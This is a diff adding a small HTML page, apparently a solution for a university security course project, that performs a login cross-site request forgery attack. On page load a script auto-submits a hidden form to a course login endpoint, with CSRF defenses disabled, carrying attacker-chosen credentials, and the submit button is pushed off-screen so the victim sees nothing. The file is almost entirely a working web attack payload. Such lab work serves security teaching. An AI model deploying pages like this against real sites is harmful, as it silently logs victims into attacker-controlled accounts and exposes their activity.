@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>you've been tricked</title>
+	<form name="myForm" id="myForm" target="_frame" action="http://ecen5032.org/project2/login?csrfdefense=0&xssdefense=4" method="POST">
+	<input type="hidden" name="username" value="attacker"/>
+	 <input type="hidden" name="password" value="l33th4x"/>
+	<input type="submit" style="position: absolute; left: -99999px;" value="my" >
+</form>
+<script type="text/javascript">
+  document.myForm.submit();
+  return false;
+</script>
+</head>
+<body>
+</body>
+</html>
